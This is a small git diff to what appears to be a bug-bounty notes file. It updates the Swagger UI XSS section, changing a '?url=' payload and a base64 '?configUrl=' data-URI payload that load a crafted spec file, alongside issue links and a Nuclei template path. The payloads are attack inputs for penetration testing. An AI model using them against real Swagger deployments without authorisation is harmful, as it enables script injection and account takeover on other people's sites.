@@ -2392,9 +2392,9 @@ Manually testing for XXE vulnerabilities generally involves
 #### <ins>Swagger XSS</ins>
 - https://github.com/swagger-api/swagger-ui/issues/1262
 - https://github.com/swagger-api/swagger-ui/issues/3847<br/>
-  `?url=https://raw.githubusercontent.com/seeu-inspace/easyg/main/XSS%20all%20the%20things/swag-test.json`
+  `?url=https://raw.githubusercontent.com/seeu-inspace/easyg/main/XSS/swag-test.json`
 - [Hacking Swagger-UI - from XSS to account takeovers](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)<br/>
-  `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlZXUtaW5zcGFjZS9lYXN5Zy9tYWluL1hTUyUyMGFsbCUyMHRoZSUyMHRoaW5ncy9zd2FnLXRlc3QueWFtbCIKfQ==`
+  `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlZXUtaW5zcGFjZS9lYXN5Zy9tYWluL1hTUy9zd2FnLXRlc3QueWFtbCIKfQo=`
 - Nuclei template `%USERPROFILE%\nuclei-templates\exposures\apis\swagger-api.yaml`
 
 #### <ins>Carriage Return Line Feed (CRLF) injection</ins>
